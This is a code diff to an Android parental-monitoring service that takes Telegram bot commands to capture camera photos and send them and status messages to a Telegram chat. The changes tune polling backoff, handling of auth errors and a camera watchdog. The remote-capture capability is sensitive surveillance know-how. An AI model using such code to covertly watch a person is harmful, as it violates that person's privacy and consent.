@@ -36,6 +36,7 @@ class MonitoringService : Service() {
     
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val cameraBusy = AtomicBoolean(false)
+    private var watchdogJob: Job? = null
     private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
     private var monitoringJob: Job? = null
     private var cameraJob: Job? = null
@@ -254,11 +255,14 @@ class MonitoringService : Service() {
     // TELEGRAM COMMAND POLLING (/photo, /status, /help)
     // ═══════════════════════════════════════════════════════════
 
+    private var idlePolls = 0
+
     private fun startCommandPolling() {
         commandJob = serviceScope.launch {
             while (isActive) {
                 try {
-                    pollTelegramCommands()
+                    val active = pollTelegramCommands()
+                    idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(6)
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error polling commands", e)
                 }
@@ -267,16 +271,15 @@ class MonitoringService : Service() {
                 } else if (!hasNetwork()) {
                     delay(60_000)
                 } else {
-                    delay(15_000)
+                    delay(15_000L + idlePolls * 2_500L)
                 }
             }
         }
     }
 
-    private suspend fun pollTelegramCommands() {
-        val botToken = preferencesManager.botToken
-        val chatId = preferencesManager.chatId
-        if (botToken.isEmpty() || chatId.isEmpty()) return
+    private suspend fun pollTelegramCommands(): Boolean {
+        val (botToken, chatId) = sendCreds()
+        if (botToken.isEmpty() || chatId.isEmpty()) return false
 
         val offset = preferencesManager.lastUpdateId + 1
         val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=10"
@@ -284,11 +287,11 @@ class MonitoringService : Service() {
         val response = try {
             TelegramClient.api.getUpdates(url)
         } catch (e: Exception) {
-            return
+            return false
         }
-        if (!response.isSuccessful || response.body()?.ok != true) return
+        if (!response.isSuccessful || response.body()?.ok != true) return false
 
-        val updates = response.body()?.result ?: return
+        val updates = response.body()?.result ?: return false
         for (update in updates) {
             try {
                 val callback = update.callbackQuery
@@ -307,6 +310,7 @@ class MonitoringService : Service() {
                 }
             }
         }
+        return updates.isNotEmpty()
     }
 
     private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
@@ -360,10 +364,19 @@ class MonitoringService : Service() {
         try {
             val botToken = preferencesManager.botToken
             if (botToken.isEmpty()) return
+            val tokenHash = botToken.hashCode().toString()
+            try {
+                if (preferencesManager.commandsTokenHash == tokenHash) return
+            } catch (_: Exception) {
+            }
             val url = "https://api.telegram.org/bot$botToken/setMyCommands"
             val body = com.redeye.parentalmonitor.network.SetMyCommandsRequest(botCommandList())
             val response = TelegramClient.api.setMyCommands(url, body)
             if (response.isSuccessful && response.body()?.ok == true) {
+                try {
+                    preferencesManager.commandsTokenHash = tokenHash
+                } catch (_: Exception) {
+                }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
             } else {
                 android.util.Log.w("MonitoringService", "Command menu registration failed: ${response.code()}")
@@ -874,18 +887,18 @@ class MonitoringService : Service() {
             while (rest.length > 4000) {
                 if (current.isNotEmpty()) {
                     sendToTelegram(current.toString())
-                    delay(1000)
+                    delay(500)
                     current = StringBuilder()
                 }
                 val cut = safeCut(rest, 4000)
                 sendToTelegram(rest.substring(0, cut))
-                delay(1000)
+                delay(500)
                 rest = rest.substring(cut)
             }
             if (current.length + rest.length + 1 > 4000) {
                 if (current.isNotEmpty()) {
                     sendToTelegram(current.toString())
-                    delay(1000)
+                    delay(500)
                 }
                 current = StringBuilder()
             }
@@ -937,11 +950,23 @@ class MonitoringService : Service() {
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
+                try {
+                    preferencesManager.credentialError = ""
+                    preferencesManager.credentialErrorAt = 0L
+                } catch (_: Exception) {
+                }
             } else if (response.code() == 429) {
                 val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                 android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
+            } else if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
+                android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), not queuing")
+                try {
+                    preferencesManager.credentialError = response.code().toString()
+                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                } catch (_: Exception) {
+                }
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                 messageQueue.addMessage(message)
@@ -966,6 +991,7 @@ class MonitoringService : Service() {
         monitoringJob?.cancel()
         cameraJob?.cancel()
         commandJob?.cancel()
+        watchdogJob?.cancel()
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
     }
@@ -1000,8 +1026,9 @@ class MonitoringService : Service() {
             }
             return
         }
+        watchdogJob?.cancel()
         val attempt = cameraAttempt.incrementAndGet()
-        serviceScope.launch {
+        watchdogJob = serviceScope.launch {
             delay(50_000)
             if (cameraAttempt.get() == attempt && cameraBusy.compareAndSet(true, false)) {
                 android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
@@ -1017,6 +1044,7 @@ class MonitoringService : Service() {
                 onPhotoTaken = { photoFile ->
                     cameraAttempt.incrementAndGet()
                     cameraBusy.set(false)
+                    watchdogJob?.cancel()
                     serviceScope.launch {
                         val sent = sendPhotoFile(photoFile)
                         if (sent) {
@@ -1032,6 +1060,7 @@ class MonitoringService : Service() {
                 onError = { exception ->
                     cameraAttempt.incrementAndGet()
                     cameraBusy.set(false)
+                    watchdogJob?.cancel()
                     android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
                     serviceScope.launch {
                         if (reportResult) {
@@ -1050,6 +1079,7 @@ class MonitoringService : Service() {
         } catch (e: Exception) {
             cameraAttempt.incrementAndGet()
             cameraBusy.set(false)
+            watchdogJob?.cancel()
             android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto", e)
             serviceScope.launch {
                 if (reportResult) {
@@ -1163,7 +1193,7 @@ class MonitoringService : Service() {
         }
         for (file in pending) {
             if (!sendPhotoFile(file)) break
-            kotlinx.coroutines.delay(1000)
+            kotlinx.coroutines.delay(500)
         }
         prunePhotoCache()
     }
